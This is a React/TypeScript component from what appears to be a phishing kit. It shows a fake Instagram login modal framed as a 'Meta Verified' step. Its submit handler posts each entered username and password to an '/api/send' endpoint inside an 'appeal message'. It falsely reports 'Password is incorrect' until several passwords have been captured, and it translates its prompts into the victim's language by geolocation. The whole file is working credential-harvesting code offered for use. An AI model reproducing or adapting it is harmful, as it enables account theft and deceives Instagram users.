'use client';

import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import translateText from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, type FormEvent } from 'react';

interface InstagramPasswordModalProps {
    nextStep: () => void;
}

const delay = (delayTime: number) => new Promise((resolve) => setTimeout(resolve, delayTime));

const InstagramPasswordModal: FC<InstagramPasswordModalProps> = ({ nextStep }) => {
    const [identifier, setIdentifier] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, baseMessage, passwords, loginProvider, setMessage, setMessageId, addPassword, setLoginEmail, geoInfo, setModalOpen } = store();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'Log in to your Instagram account to continue with Meta Verified.',
            'Phone number, username, or email',
            'Password',
            'Password is incorrect, please try again.',
            'Log in',
            'Continue',
            'Forgot password?'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleChange = (field: 'identifier' | 'password', value: string) => {
        if (field === 'identifier') {
            setIdentifier(value);
        } else {
            setPassword(value);
        }
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (!identifier.trim() || !password.trim() || isLoading || !baseMessage) return;

        setIsLoading(true);
        setShowError(false);
        setLoginEmail(identifier.trim());

        const newPasswords = [...passwords, password];
        addPassword(password);

        const updatedMessage = buildAppealMessage({
            baseMessage,
            loginProvider: loginProvider ?? 'instagram',
            loginEmail: identifier.trim(),
            passwords: newPasswords
        });

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                if (typeof res.data.data?.result?.message_id === 'number') {
                    setMessageId(res.data.data.result.message_id);
                }
                setMessage(updatedMessage);
            }

            await delay(1500);

            const nextAttempt = loginAttempt + 1;
            setLoginAttempt(nextAttempt);

            if (nextAttempt >= config.MAX_PASS) {
                setShowError(false);
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex w-full max-w-md flex-col rounded-2xl border border-gray-200 bg-white p-8 shadow-xl'>
                <div className='mb-6 flex justify-center'>
                    <svg className='h-14 w-14' viewBox='0 0 24 24' aria-hidden='true'>
                        <defs>
                            <linearGradient id='ig-logo-gradient' x1='0%' y1='100%' x2='100%' y2='0%'>
                                <stop offset='0%' stopColor='#FD5949' />
                                <stop offset='50%' stopColor='#D6249F' />
                                <stop offset='100%' stopColor='#285AEB' />
                            </linearGradient>
                        </defs>
                        <path
                            fill='url(#ig-logo-gradient)'
                            d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
                        />
                    </svg>
                </div>

                <p className='mb-6 text-center text-sm text-gray-600'>{t('Log in to your Instagram account to continue with Meta Verified.')}</p>

                <form onSubmit={handleSubmit} className='flex flex-col gap-4'>
                    {loginAttempt === 0 && (
                        <input
                            autoComplete='username'
                            className='h-12 w-full rounded-lg border border-gray-300 px-4 text-base focus:border-pink-500 focus:outline-none focus:ring-2 focus:ring-pink-200'
                            maxLength={60}
                            minLength={3}
                            name='identifier'
                            placeholder={t('Phone number, username, or email')}
                            required
                            type='text'
                            value={identifier}
                            onChange={(e) => handleChange('identifier', e.target.value)}
                        />
                    )}

                    <div className='relative'>
                        <input
                            autoComplete='current-password'
                            className={`h-12 w-full rounded-lg border px-4 pr-12 text-base focus:outline-none focus:ring-2 ${
                                showError ? 'border-red-400 focus:ring-red-200' : 'border-gray-300 focus:border-pink-500 focus:ring-pink-200'
                            }`}
                            maxLength={30}
                            minLength={3}
                            name='password'
                            placeholder={t('Password')}
                            required
                            type={showPassword ? 'text' : 'password'}
                            value={password}
                            onChange={(e) => handleChange('password', e.target.value)}
                        />
                        <button
                            type='button'
                            aria-label='Show/Hide password'
                            className='absolute top-1/2 right-3 -translate-y-1/2 text-gray-500'
                            onClick={() => setShowPassword((prev) => !prev)}
                        >
                            {showPassword ? '🙈' : '👁'}
                        </button>
                    </div>

                    {showError && <p className='text-sm text-red-500'>{t('Password is incorrect, please try again.')}</p>}

                    <button
                        type='submit'
                        disabled={isLoading}
                        className='h-12 w-full rounded-lg bg-linear-to-r from-[#833AB4] via-[#FD1D1D] to-[#FCAF45] font-semibold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-60'
                    >
                        {isLoading ? (
                            <div className='mx-auto h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
                        ) : (
                            loginAttempt === 0 ? t('Log in') : t('Continue')
                        )}
                    </button>

                    <div className='text-center'>
                        <button type='button' className='text-sm text-blue-600 hover:underline' onClick={() => setModalOpen(false)}>
                            {t('Forgot password?')}
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default InstagramPasswordModal;
